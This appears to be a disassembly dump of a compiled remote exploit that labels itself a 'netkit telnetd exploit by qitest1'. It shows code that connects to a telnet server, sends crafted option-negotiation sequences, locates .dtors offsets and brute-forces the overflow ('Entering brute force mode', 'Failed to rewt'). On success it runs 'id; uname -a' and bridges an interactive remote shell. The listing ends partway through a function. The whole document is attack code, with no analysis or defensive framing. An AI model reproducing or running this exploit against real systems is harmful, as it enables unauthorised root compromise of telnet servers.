xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
push eax
call 0x80489de
pop ebx
add ebx, 0x345e
mov eax, dword [ebx + 0x8c]
test eax, eax
je 0x80489f1
call eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [obj.completed.1]
test edx, edx
jne 0x8048a59
mov edx, dword [obj.p.0]
mov eax, dword [edx]
test eax, eax
je 0x8048a36
lea esi, [esi]
lea eax, [edx + 4]
mov dword [obj.p.0], eax
call dword [edx]
mov edx, dword [obj.p.0]
mov ecx, dword [edx]
test ecx, ecx
jne 0x8048a20
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048a4f
sub esp, 0xc
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
add esp, 0x10
mov eax, 1
mov dword [obj.completed.1], eax
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov eax, sym.imp.__register_frame_info
mov ebp, esp
sub esp, 8
test eax, eax
je 0x8048a94
sub esp, 8
push obj.object.2
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
add esp, 0x10
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [obj.__CTOR_LIST__]
mov ebx, obj.__CTOR_LIST__
cmp eax, 0xffffffff
je 0x804a46c
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x804a460
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x1008
sub esp, 0xc
push 0x18
push 0xfc
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push 0x20
push 0xfc
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push 0x23
push 0xfc
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
sub esp, 4
push obj.tosend
push 0x804a9c4
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x10
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push 1
push 0xfb
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
leave
ret
jmp dword [reloc.sprintf]
jmp dword [reloc.strlen]
jmp dword [reloc.send]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 0
sub esp, 8
push dword [arg_8h]
push str.Usage:__s__options__n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push str.Options:_n___h_hostname_n___t_target_n___d_.dtors_location_n___o_offset__for_getting_where_the_bruting_has_to_start_n___l__local_connection__127.0.0.1___no_arg_required__nAvailable_targets:_n
call sym.imp.printf
add esp, 0x10
mov edx, dword [var_4h]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, obj.target
cmp dword [edx + eax], 0x45
jne 0x804a03c
sub esp, 0xc
push 1
call sym.imp.exit
lea esi, [esi]
sub esp, 4
mov edx, dword [var_4h]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbc4
push dword [edx + eax]
mov edx, dword [var_4h]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, obj.target
push dword [edx + eax]
push str.___d___s_n
call sym.imp.printf
add esp, 0x10
lea eax, [var_4h]
inc dword [eax]
jmp 0x804a014
jmp dword [reloc.printf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
sub esp, 0x418
mov dword [var_40ch], 0
mov dword [var_410h], 0
sub esp, 0xc
push 5
push 0xfd
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push 1
push 0xfb
push 0xff
push str._c_c_c
lea eax, [buffer]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 0
lea esi, [esi]
mov eax, dword [obj.fildap]
mov ecx, eax
imul ecx, dword [0x804bef8]
mov edx, dword [var_4h]
mov eax, dword [0x804bf00]
sub eax, edx
cmp ecx, eax
jne 0x80498ac
jmp 0x80498cc
mov esi, esi
mov edx, dword [var_4h]
mov eax, dword [0x804bf00]
sub eax, edx
cdq
idiv dword [0x804bef8]
mov dword [obj.fildap], eax
lea eax, [var_4h]
inc dword [eax]
jmp 0x804988c
lea esi, [esi]
nop
lea esi, [esi]
cmp dword [0x804bef4], 0x3e8
jle 0x80498fc
sub esp, 8
push str.__failed_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
nop
inc dword [0x804bef4]
mov eax, dword [obj.fildap]
mov edx, eax
imul edx, dword [0x804bef8]
mov eax, dword [0x804bef4]
imul eax, dword [0x804befc]
lea eax, [eax + edx]
cmp eax, dword [0x804bf00]
jl 0x804992c
jmp 0x8049957
mov esi, esi
inc dword [0x804bef4]
mov eax, dword [obj.fildap]
mov edx, eax
imul edx, dword [0x804bef8]
mov eax, dword [0x804bef4]
imul eax, dword [0x804befc]
lea eax, [eax + edx]
cmp eax, dword [0x804bf00]
jl 0x804992c
mov eax, dword [obj.fildap]
mov edx, eax
imul edx, dword [0x804bef8]
mov eax, dword [0x804bef4]
imul eax, dword [0x804befc]
lea eax, [eax + edx]
cmp dword [0x804bf00], eax
jne 0x8049980
jmp 0x804998c
mov esi, esi
dec dword [obj.fildap]
jmp 0x80498d0
nop
leave
ret
jmp dword [reloc.fprintf]
push ebp
mov ebp, esp
sub esp, 0x28
sub esp, 4
push 0
push 1
push 2
call sym.imp.socket
add esp, 0x10
mov eax, eax
mov dword [socket], eax
cmp dword [socket], 0xffffffff
jne 0x80492e4
sub esp, 0xc
push str.socket__
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 0xffffffffffffffff
call sym.imp.exit
sub esp, 0xc
push dword [arg_8h]
call sym.imp.gethostbyname
add esp, 0x10
mov eax, eax
mov dword [var_1ch], eax
cmp dword [var_1ch], 0
jne 0x8049318
sub esp, 0xc
push str.gethostbyname__
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 0xffffffffffffffff
call sym.imp.exit
nop
sub esp, 4
push 0x10
push 0
lea eax, [addr]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
mov eax, dword [var_1ch]
push dword [eax + 0xc]
mov eax, dword [var_1ch]
mov eax, dword [eax + 0x10]
push dword [eax]
lea eax, [addr]
add eax, 4
push eax
call sym.imp.memcpy
add esp, 0x10
mov word [addr], 2
movzx eax, word [arg_ch]
sub esp, 0xc
push eax
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov eax, eax
mov word [var_16h], ax
sub esp, 4
push 0x10
lea eax, [addr]
push eax
push dword [socket]
call sym.imp.connect
add esp, 0x10
mov eax, eax
cmp eax, 0xffffffff
jne 0x804938c
mov eax, 0xffffffff
jmp 0x8049391
nop
mov eax, dword [socket]
mov eax, eax
leave
ret
jmp dword [reloc.socket]
jmp dword [reloc.perror]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.memset]
jmp dword [reloc.memcpy]
jmp dword [reloc.htons]
jmp dword [reloc.connect]
push ebp
mov ebp, esp
sub esp, 8
call loc.gcc2_compiled.
nop
call sym.frame_dummy
call loc.gcc2_compiled._2
leave
ret
push ebp
mov ebp, esp
sub esp, 0x208
mov dword [obj.fildap], 0
mov dword [0x804bef4], 0
sub esp, 4
push 0x200
push 0
lea eax, [s]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
push dword [arg_8h]
push str._r_n__s_:_yes__r_n
lea eax, [s]
push eax
call sym.imp.sprintf
add esp, 0x10
lea eax, [s]
sub esp, 0xc
push eax
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov dword [0x804bef8], eax
mov dword [0x804befc], 3
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc028
sub esp, 8
push 0x804a8e3
push dword [fildes]
call sym.imp.fdopen
add esp, 0x10
mov eax, eax
mov dword [ebp - 0xc024], eax
mov eax, dword [obj.charzist]
mov dword [ebp - 0xc020], eax
sub esp, 0xc
push dword [arg_ch]
call sym.calc_rewtn0
add esp, 0x10
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbcc
mov eax, dword [edx + eax]
mov dword [0x804bf00], eax
sub esp, 0xc
push dword [fildes]
call sym.cl3anuppa
add esp, 0x10
sub esp, 0xc
push dword [ebp - 0xc024]
call sym.imp.fflush
add esp, 0x10
sub esp, 0xc
push 0x186a0
call sym.imp.usleep
add esp, 0x10
sub esp, 4
push 0xa000
lea eax, [ebp - 0xa018]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
mov esi, esi
sub esp, 0xc
push str.Calculating_some_stuff..._n
call sym.imp.printf
add esp, 0x10
call sym.calc_rewtn1
sub esp, 4
push dword [0x804bef4]
push dword [obj.fildap]
push str.__done__fildap.ayt_n:__d_and_fildap.opt_n:__d_n
call sym.imp.printf
add esp, 0x10
sub esp, 8
mov eax, dword [ebp - 0xc020]
movsx eax, byte [eax]
push eax
push str.Filling_for_char:__p..._n
call sym.imp.printf
add esp, 0x10
push 0xf6
push 0xff
push str._c_c
lea eax, [ebp - 0xc01c]
push eax
call sym.imp.sprintf
add esp, 0x10
sub esp, 4
push 0x1000
push 0
lea eax, [ebp - 0xb018]
push eax
call sym.imp.memset
add esp, 0x10
mov dword [var_ch], 0
lea esi, [esi]
mov eax, dword [var_ch]
cmp eax, dword [obj.fildap]
jl 0x804961c
jmp 0x804963c
lea esi, [esi]
sub esp, 8
lea eax, [ebp - 0xc01c]
push eax
lea eax, [ebp - 0xb018]
push eax
call sym.imp.strcat
add esp, 0x10
lea eax, [var_ch]
inc dword [eax]
jmp 0x804960c
sub esp, 8
lea eax, [ebp - 0xb018]
push eax
lea eax, [ebp - 0xc018]
push eax
call sym.imp.strcpy
add esp, 0x10
sub esp, 0xc
mov eax, dword [ebp - 0xc020]
movsx eax, byte [eax]
push eax
push 0xfd
push 0xff
push str._c_c_c
lea eax, [ebp - 0xc01c]
push eax
call sym.imp.sprintf
add esp, 0x20
sub esp, 4
push 0x1000
push 0
lea eax, [ebp - 0xb018]
push eax
call sym.imp.memset
add esp, 0x10
mov dword [var_ch], 0
mov eax, dword [var_ch]
cmp eax, dword [0x804bef4]
jl 0x80496b0
jmp 0x80496d0
lea esi, [esi]
sub esp, 8
lea eax, [ebp - 0xc01c]
push eax
lea eax, [ebp - 0xb018]
push eax
call sym.imp.strcat
add esp, 0x10
lea eax, [var_ch]
inc dword [eax]
jmp 0x80496a0
sub esp, 8
lea eax, [ebp - 0xb018]
push eax
lea eax, [ebp - 0xc018]
push eax
call sym.imp.strcat
add esp, 0x10
sub esp, 8
lea eax, [ebp - 0xc018]
push eax
lea eax, [ebp - 0xb018]
push eax
call sym.imp.strcpy
add esp, 0x10
push 0
lea eax, [ebp - 0xb018]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [ebp - 0xb018]
push eax
push dword [fildes]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.cl3anuppa
add esp, 0x10
sub esp, 0xc
push dword [ebp - 0xc024]
call sym.imp.fflush
add esp, 0x10
sub esp, 0xc
push 0x186a0
call sym.imp.usleep
add esp, 0x10
sub esp, 4
push 0xa000
lea eax, [ebp - 0xa018]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
sub esp, 0xc
push str.__done_n
call sym.imp.printf
add esp, 0x10
mov eax, dword [ebp - 0xc020]
cmp byte [eax], 0xcc
jne 0x8049798
add dword [0x804bf00], 9
mov eax, dword [ebp - 0xc020]
cmp byte [eax], 0x10
jne 0x80497aa
sub dword [0x804bf00], 2
mov eax, dword [ebp - 0xc020]
cmp byte [eax], 0x69
jne 0x80497bb
dec dword [0x804bf00]
mov eax, dword [ebp - 0xc020]
cmp byte [eax], 0x68
je 0x80497d4
mov eax, dword [ebp - 0xc020]
cmp byte [eax], 0x78
je 0x80497d4
jmp 0x80497db
nop
sub dword [0x804bf00], 2
lea eax, [ebp - 0xc020]
inc dword [eax]
sub esp, 0xc
push 2
call sym.imp.sleep
add esp, 0x10
mov eax, dword [ebp - 0xc020]
cmp byte [eax], 0
jne 0x8049580
leave
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x4b4
mov dword [buffer], str.id__uname__a_n
push 0
sub esp, 8
push dword [buffer]
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
push dword [buffer]
push dword [fildes]
call sym.imp.send
add esp, 0x10
lea esi, [esi]
mov eax, 0
mov ecx, 0x20
lea edi, [readfds]
cld
rep stosd dword es:[edi], eax
mov eax, ecx
mov dword [var_4ach], eax
mov eax, edi
mov dword [var_4b0h], eax
mov eax, dword [fildes]
shr eax, 5
imul ecx, eax, 4
lea eax, [readfds]
mov edx, eax
mov eax, dword [fildes]
and eax, 0x1f
bts dword [ecx + edx], eax
mov eax, 0
bts dword [readfds], eax
sub esp, 0xc
push 0
push 0
push 0
lea eax, [readfds]
push eax
mov eax, dword [fildes]
inc eax
push eax
call sym.imp.select
add esp, 0x20
mov eax, dword [fildes]
mov ecx, eax
and ecx, 0x1f
mov eax, dword [fildes]
shr eax, 5
imul edx, eax, 4
lea eax, [readfds]
mov eax, eax
bt dword [edx + eax], ecx
setb al
test al, al
je 0x8049ac2
sub esp, 4
push 0x400
lea eax, [ptr]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
mov eax, eax
mov dword [nbytes], eax
cmp dword [nbytes], 0
jg 0x8049a9c
sub esp, 0xc
push str.Connection_closed_by_foreign_host._n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.exit
mov esi, esi
lea eax, [ptr]
mov edx, eax
mov eax, dword [nbytes]
mov byte [eax + edx], 0
sub esp, 8
lea eax, [ptr]
push eax
push 0x804a9c4
call sym.imp.printf
add esp, 0x10
mov eax, 0
bt dword [readfds], eax
setb al
test al, al
je 0x80499d0
sub esp, 4
push 0x400
lea eax, [ptr]
push eax
push 0
call sym.imp.read
add esp, 0x10
mov eax, eax
mov dword [nbytes], eax
cmp dword [nbytes], 0
jle 0x80499d0
lea eax, [ptr]
mov edx, eax
mov eax, dword [nbytes]
mov byte [eax + edx], 0
sub esp, 4
push dword [nbytes]
lea eax, [ptr]
push eax
push dword [fildes]
call sym.imp.write
add esp, 0x10
jmp 0x80499d0
jmp dword [reloc.select]
jmp dword [reloc.read]
jmp dword [reloc.write]
push ebp
mov ebp, esp
sub esp, 0x418
mov dword [var_40ch], 0
mov dword [var_410h], 0
sub esp, 4
push 0x400
push 0
lea eax, [ptr]
push eax
call sym.imp.memset
add esp, 0x10
push 0xf0
push 0xff
push dword [arg_10h]
push 1
push dword [arg_ch]
push 0
push 0
push 0x27
push 0xfa
push 0xff
push str._c_c_c_c_c_s_c_s_c_c
lea eax, [ptr]
push eax
call sym.imp.sprintf
add esp, 0x30
sub esp, 4
push 0x200
lea eax, [ptr]
push eax
push dword [fd]
call sym.imp.write
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x420
mov dword [var_10h], 0
sub esp, 0xc
push str._n__netkit_telnetd_exploit_by_qitest1_n_n
call sym.imp.printf
add esp, 0x10
cmp dword [argc], 1
jne 0x8048ae8
sub esp, 0xc
mov eax, dword [argv]
push dword [eax]
call sym.usage
add esp, 0x10
mov byte [dest], 0
nop
sub esp, 4
push str.h:t:d:o:l
push dword [argv]
push dword [argc]
call sym.imp.getopt
add esp, 0x10
mov eax, eax
mov dword [var_ch], eax
cmp dword [var_ch], 0xffffffff
jne 0x8048b18
jmp 0x8048bf8
mov esi, esi
mov eax, dword [var_ch]
sub eax, 0x64
mov dword [var_420h], eax
cmp dword [var_420h], 0x10
ja case.0x8048b3e.1
mov edx, dword [var_420h]
mov eax, dword [edx*4 + 0x804a6d0]
jmp eax
sub esp, 4
push 0x400
push dword [obj.optarg]
lea eax, [dest]
push eax
call sym.imp.strncpy
add esp, 0x10
mov byte [var_19h], 0
jmp 0x8048af0
nop
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov eax, eax
mov dword [obj.sel], eax
jmp 0x8048af0
lea esi, [esi]
sub esp, 4
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
add eax, 0x804bbc8
push eax
push 0x804a631
push dword [obj.optarg]
call sym.imp.sscanf
add esp, 0x10
jmp 0x8048af0
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov eax, eax
mov dword [obj.o], eax
jmp 0x8048af0
lea esi, [esi]
mov dword [var_10h], 1
jmp 0x8048af0
sub esp, 0xc
mov eax, dword [argv]
push dword [eax]
call sym.usage
add esp, 0x10
jmp 0x8048af0
lea esi, [esi]
cmp byte [dest], 0
jne 0x8048c11
sub esp, 0xc
mov eax, dword [argv]
push dword [eax]
call sym.usage
add esp, 0x10
cmp dword [var_10h], 0
jne 0x8048cd8
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbcc
cmp dword [edx + eax], 0
jne 0x8048c58
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbcc
mov dword [edx + eax], 0x640c
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
cmp dword [edx + eax], 0
jne 0x8048c93
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
mov dword [edx + eax], 0x70bc
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, 0x804bbc4
cmp dword [edx + eax], 0
jne 0x8048d8b
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, 0x804bbc4
mov dword [edx + eax], 0xcb0
jmp 0x8048d8b
nop
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbcc
cmp dword [edx + eax], 0
jne 0x8048d15
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbcc
mov dword [edx + eax], 0x5394
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
cmp dword [edx + eax], 0
jne 0x8048d50
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
mov dword [edx + eax], 0x7044
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, 0x804bbc4
cmp dword [edx + eax], 0
jne 0x8048d8b
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, 0x804bbc4
mov dword [edx + eax], 0xc38
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea esi, [eax*8]
mov ebx, 0x804bbcc
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea ecx, [eax*8]
mov edx, 0x804bbcc
mov eax, dword [obj.o]
add eax, dword [ecx + edx]
mov dword [esi + ebx], eax
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea esi, [eax + 0x10]
mov ebx, obj.target
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea ecx, [eax + 0x10]
mov edx, obj.target
mov eax, dword [obj.o]
add eax, dword [ecx + edx]
mov dword [esi + ebx], eax
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea esi, [eax + 0x10]
mov ebx, 0x804bbc4
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea ecx, [eax + 0x10]
mov edx, 0x804bbc4
mov eax, dword [obj.o]
add eax, dword [ecx + edx]
mov dword [esi + ebx], eax
cmp dword [var_10h], 0
jne 0x8048e4c
mov dword [obj.charzist], 0x804bc5c
jmp 0x8048e56
mov esi, esi
mov dword [obj.charzist], 0x804bc62
sub esp, 4
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbc4
push dword [edx + eax]
lea eax, [dest]
push eax
push str.Host:__s_n__as:__s_n
call sym.imp.printf
add esp, 0x10
sub esp, 8
lea eax, [dest]
push eax
push str.Looking_for_the_hostname_in_the_AYT_answer_at__s..._n
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
lea eax, [dest]
push eax
call sym.__ck_hnam_re
add esp, 0x10
mov eax, eax
mov dword [var_41ch], eax
sub esp, 8
push dword [var_41ch]
push str.__found:__s_n
call sym.imp.printf
add esp, 0x10
sub esp, 8
push dword [var_41ch]
lea eax, [dest]
push eax
call sym.brewtine
add esp, 0x10
mov eax, eax
cmp eax, 0xffffffff
jne 0x8048f10
sub esp, 8
push str.Failed_to_rewt..._n__exiting_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
mov esi, esi
lea esp, [var_8h]
pop ebx
pop esi
pop ebp
ret
push ebp
mov ebp, esp
push ebx
push edx
call 0x804a48a
pop ebx
add ebx, 0x19b2
lea esi, [esi]
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x234
sub esp, 0xc
push 0x100
call sym.imp.malloc
add esp, 0x10
mov eax, eax
mov dword [s], eax
mov dword [var_218h], 0
sub esp, 4
push 4
push 0
push dword [s]
call sym.imp.memset
add esp, 0x10
sub esp, 8
push 0x17
push dword [arg_8h]
call sym.sockami
add esp, 0x10
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0xffffffff
jne 0x804a108
sub esp, 8
push str.__unable_to_connect_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
mov esi, esi
sub esp, 8
push 0x804a8e3
push dword [fildes]
call sym.imp.fdopen
add esp, 0x10
mov eax, eax
mov dword [stream], eax
sub esp, 4
push 0x100
lea eax, [buf]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
sub esp, 8
push 0x804aac3
lea eax, [buffer]
push eax
call sym.imp.strcpy
add esp, 0x10
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
lea eax, [buffer]
push eax
push dword [fildes]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push dword [stream]
call sym.imp.fflush
add esp, 0x10
sub esp, 0xc
push 0x186a0
call sym.imp.usleep
add esp, 0x10
sub esp, 4
push 0x100
push 0
lea eax, [buf]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
push 0x100
lea eax, [buf]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
lea eax, [buf]
sub esp, 8
push 0x5b
push eax
call sym.imp.strchr
add esp, 0x10
mov eax, eax
mov eax, eax
mov dword [var_20ch], eax
cmp dword [var_20ch], 0
jne 0x804a228
sub esp, 8
push str.__failed_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
mov esi, esi
lea eax, [var_20ch]
inc dword [eax]
mov eax, dword [var_20ch]
cmp byte [eax], 3
jne 0x804a2ec
sub esp, 4
push 0x100
push 0
lea eax, [buf]
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
push 0x100
lea eax, [buf]
push eax
push dword [fildes]
call sym.imp.read
add esp, 0x10
lea eax, [buf]
mov dword [var_20ch], eax
lea esi, [esi]
mov eax, dword [var_20ch]
cmp byte [eax], 0x5b
jne 0x804a294
jmp 0x804a2a0
lea esi, [esi]
lea eax, [var_20ch]
inc dword [eax]
jmp 0x804a284
mov esi, esi
lea eax, [var_20ch]
inc dword [eax]
mov eax, dword [var_20ch]
cmp byte [eax], 0x20
jne 0x804a2c0
mov eax, dword [s]
mov eax, eax
jmp 0x804a3c1
mov eax, dword [var_218h]
mov edx, dword [s]
add edx, eax
mov eax, dword [var_20ch]
mov al, byte [eax]
mov byte [edx], al
lea eax, [var_20ch]
inc dword [eax]
lea eax, [var_218h]
inc dword [eax]
jmp 0x804a2a8
mov esi, esi
nop
lea esi, [esi]
mov eax, dword [var_20ch]
cmp byte [eax], 0x20
jne 0x804a300
jmp 0x804a32c
lea esi, [esi]
mov eax, dword [var_218h]
mov edx, dword [s]
add edx, eax
mov eax, dword [var_20ch]
mov al, byte [eax]
mov byte [edx], al
lea eax, [var_20ch]
inc dword [eax]
lea eax, [var_218h]
inc dword [eax]
jmp 0x804a2f0
mov esi, esi
sub esp, 0xc
push dword [s]
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov edx, eax
mov dword [var_22ch], 0xaaaaaaab
mov eax, dword [var_22ch]
mul edx
mov eax, edx
shr eax, 1
mov dword [var_21ch], eax
mov eax, dword [var_21ch]
mov ebx, eax
shl ebx, 1
add ebx, eax
sub esp, 0xc
push dword [s]
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov eax, eax
cmp ebx, eax
jne 0x804a3a8
sub esp, 4
push dword [s]
push str.__the_hostname___s__is_a_multiple_of_3_letters_long_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
mov eax, dword [s]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.malloc]
jmp dword [reloc.fdopen]
jmp dword [reloc.strcpy]
jmp dword [reloc.fflush]
jmp dword [reloc.usleep]
jmp dword [reloc.strchr]
jmp dword [reloc.close]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 1
sub esp, 0xc
push str.Entering_brute_force_mode..._n__done_n_n
call sym.imp.printf
add esp, 0x10
lea esi, [esi]
cmp dword [var_4h], 0x63
jle 0x804a3f0
jmp 0x804a434
sub esp, 8
push dword [var_4h]
push str.Trying_for_the__d
call sym.imp.printf
add esp, 0x10
sub esp, 8
push dword [arg_ch]
push dword [arg_8h]
call sym.try_this_time
add esp, 0x10
mov eax, eax
cmp eax, 0xffffffff
jne 0x804a42b
sub esp, 0xc
push str.Brewtine..._n__failed_n_n
call sym.imp.printf
add esp, 0x10
lea eax, [var_4h]
inc dword [eax]
jmp 0x804a3e8
mov esi, esi
mov eax, 0xffffffff
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0xa414
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, 0x804bbc4
push dword [edx + eax]
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
shl eax, 3
lea edx, [eax + 0x10]
mov eax, obj.target
push dword [edx + eax]
mov edx, dword [obj.sel]
mov eax, edx
shl eax, 1
add eax, edx
lea edx, [eax*8]
mov eax, 0x804bbcc
push dword [edx + eax]
push str.__dast:__d__disto:__p__pad:__d_n
call sym.imp.printf
add esp, 0x10
sub esp, 8
push dword [arg_8h]
